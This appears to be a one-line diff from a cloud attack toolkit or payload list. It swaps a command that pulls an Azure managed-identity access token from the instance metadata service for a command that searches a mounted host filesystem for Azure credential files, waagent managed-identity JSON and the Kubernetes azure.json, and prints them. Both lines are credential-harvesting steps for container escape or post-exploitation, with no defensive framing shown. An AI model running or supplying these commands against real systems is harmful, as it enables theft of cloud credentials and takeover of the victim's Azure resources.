@@ -1,1 +1,1 @@
-wget -q -O - --header="Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null | grep -o "\"access_token\":\"[^\"]*\"" | cut -d\" -f4 # GETARM
+find /host/home -name ".azure" -type d 2>/dev/null; find /host/root -name ".azure" -type d 2>/dev/null; cat /host/home/*/az.json 2>/dev/null; cat /host/var/lib/waagent/ManagedIdentity-*.json 2>/dev/null | head -5; ls /host/etc/kubernetes/azure.json 2>/dev/null && echo FOUND # SEA2-AZ
